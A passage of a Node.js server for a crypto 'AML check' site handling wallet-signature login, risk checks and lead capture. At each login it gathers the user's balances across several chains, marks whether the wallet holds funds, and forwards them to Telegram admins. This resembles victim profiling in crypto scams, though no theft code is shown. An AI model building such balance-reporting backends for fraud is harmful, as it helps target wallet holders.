        : { ok: false, balance: "0", rawBalance: "0", error: usdtBalance.error },
      trx: trxBalance.ok
        ? {
            ok: true,
            balance: trxBalance.balance,
            rawBalance: trxBalance.rawBalance.toString(),
            source: trxBalance.source,
          }
        : { ok: false, balance: "0", rawBalance: "0", error: trxBalance.error },
      hasFunds: (usdtBalance.ok && usdtBalance.rawBalance > 0n) || (trxBalance.ok && trxBalance.rawBalance > 0n),
      telegramNotifications,
    });
  }

  if (request.method === "POST" && pathname === "/api/auth/wallet") {
    const { address, signature, nonce, chainId, tronAddress, btcAddress } = await readBody(request);
    const walletChain = "evm";

    if (!signature || !nonce) {
      return sendJson(request, response, 400, { error: "Нужны nonce и подпись кошелька" });
    }

    const nonceKey = getNonceKey(walletChain, String(nonce));
    const nonceRecord = nonces.get(nonceKey);
    if (!nonceRecord || nonceRecord.expiresAt < Date.now()) {
      nonces.delete(nonceKey);
      return sendJson(request, response, 400, { error: "Nonce истёк. Подключите кошелёк ещё раз" });
    }

    let normalized;
    let requestedAddress = null;
    try {
      normalized = getAddress(verifyMessage(nonceRecord.message, signature));
      if (address && isAddress(address)) requestedAddress = getAddress(address);
    } catch {
      return sendJson(request, response, 401, { error: "Некорректная подпись" });
    }

    nonces.delete(nonceKey);
    upsertWalletUser(normalized);
    const session = createUserSession(normalized);

    const portfolio = await buildWalletPortfolio({
      evmAddress: normalized,
      tronAddress,
      btcAddress,
      preferredChainId: chainId,
    });

    const telegramNotifications = await notifyTelegramAdmins(
      [
        "Пользователь авторизовался через Trust Wallet",
        "",
        requestedAddress && requestedAddress !== normalized ? `Запрошенный EVM: ${requestedAddress}` : null,
        `Сеть входа: ${parseChainId(chainId) || 1}`,
        "",
        ...formatPortfolioTelegramLines(portfolio),
        "",
        "Доступ: только подпись владения адресом, публичные балансы EVM/TRX/BTC/USDT и история AML-проверок.",
        `Время: ${formatDate(nowIso())}`,
      ]
        .filter(Boolean)
        .join("\n"),
    );

    const tokenBalances = [
      ...(portfolio.usdtTrc20?.ok
        ? [{ network: "TRON", token: "USDT TRC20", balance: portfolio.usdtTrc20.balance, symbol: "USDT" }]
        : []),
      ...portfolio.evmUsdt
        .filter((item) => item.ok)
        .map((item) => ({
          network: item.network,
          token: `USDT ${item.label || ""}`.trim(),
          balance: item.balance,
          symbol: "USDT",
          chainId: item.chainId,
        })),
    ];

    return sendJson(request, response, 200, {
      ok: true,
      chain: walletChain,
      address: normalized,
      requestedAddress,
      tronAddress: portfolio.tronAddress,
      btcAddress: portfolio.btcAddress,
      role: "user",
      telegramNotifications,
      balancesFound:
        portfolio.evmNatives.filter((item) => item.wei > 0n).length +
        tokenBalances.length +
        (portfolio.trx?.ok && portfolio.trx.rawBalance > 0n ? 1 : 0) +
        (portfolio.btc?.ok && portfolio.btc.rawBalance > 0n ? 1 : 0),
      nativeBalances: portfolio.evmNatives.map((item) => ({
        chainId: item.chainId,
        network: item.network,
        balance: item.balance,
        symbol: item.symbol,
      })),
      tokenBalances,
      portfolio,
      ...session,
    });
  }

  if (request.method === "GET" && pathname === "/api/auth/session") {
    const session = getUserSession(request);
    if (!session) return sendJson(request, response, 401, { error: "Пользователь не подключён" });
    return sendJson(request, response, 200, {
      ok: true,
      address: session.address,
      role: "user",
      token: session.token,
      expiresAt: session.expiresAt,
    });
  }

  if (request.method === "POST" && pathname === "/api/auth/logout") {
    deleteSession(request);
    return sendJson(request, response, 200, { ok: true });
  }

  if (request.method === "POST" && pathname === "/api/checks") {
    const session = getUserSession(request);
    if (!session) return sendJson(request, response, 401, { error: "Сначала подключите кошелёк" });

    const { wallet } = await readBody(request);
    if (!wallet || String(wallet).trim().length < 8) {
      return sendJson(request, response, 400, { error: "Введите корректный адрес или tx hash" });
    }

    const checkedWallet = String(wallet).trim();
    const result = scoreWallet(checkedWallet);
    const record = {
      id: crypto.randomUUID(),
      userWallet: session.address,
      wallet: checkedWallet,
      txHash: null,
      ...result,
      createdAt: nowIso(),
    };
    insertCheck(record);
    const telegramNotifications = await notifyTelegramAdmins(
      `Новая проверка\n\nПользователь: ${record.userWallet}\nАдрес/hash: ${record.wallet}\nРиск: ${record.level} (${record.score}/100)`,
    );
    return sendJson(request, response, 201, { ...record, telegramNotifications });
  }

  if (request.method === "POST" && pathname === "/api/leads") {
    const body = await readBody(request);
    if (!body.name || !body.contact) {
      return sendJson(request, response, 400, { error: "Укажите имя и контакт" });
    }
    const record = {
      id: crypto.randomUUID(),
      name: String(body.name).trim(),
      contact: String(body.contact).trim(),
      message: String(body.message || "").trim(),
      createdAt: nowIso(),
    };
    insertLead(record);
    const telegramNotifications = await notifyTelegramAdmins(
      `Новая заявка\n\nИмя: ${record.name}\nКонтакт: ${record.contact}\nСообщение: ${record.message || "-"}`,
    );
    return sendJson(request, response, 201, { ...record, telegramNotifications });
  }

  return sendJson(request, response, 404, { error: "API endpoint не найден" });
};

const serveStatic = async (response, pathname) => {
  const safePath = pathname === "/" ? "/index.html" : decodeURIComponent(pathname);
  const filePath = path.normalize(path.join(root, safePath));

  if (!filePath.startsWith(root) || filePath.startsWith(dataDir)) {
    response.writeHead(403);
    response.end("Forbidden");
    return;
  }

  try {
    const stat = await fsp.stat(filePath);
    if (!stat.isFile()) throw new Error("Not file");
    response.writeHead(200, {
      "Content-Type": mimeTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream",
    });
    fs.createReadStream(filePath).pipe(response);
  } catch {
    response.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
    response.end("Страница не найдена");
  }
};

const server = http.createServer(async (request, response) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);
    if (url.pathname.startsWith("/api/")) {
      await handleApi(request, response, url.pathname);
      return;
    }
    await serveStatic(response, url.pathname);
  } catch (error) {
    sendJson(request, response, 500, { error: error.message || "Внутренняя ошибка сервера" });
  }
});

ensureDb();
server.listen(port, () => {
  console.log(`AML Best API running at http://localhost:${port}`);
  startTelegram().catch((error) => {
    telegramState.status = "error";
    telegramState.lastError = error.message;
    console.error("Telegram bot stopped:", error.message);
  });
});
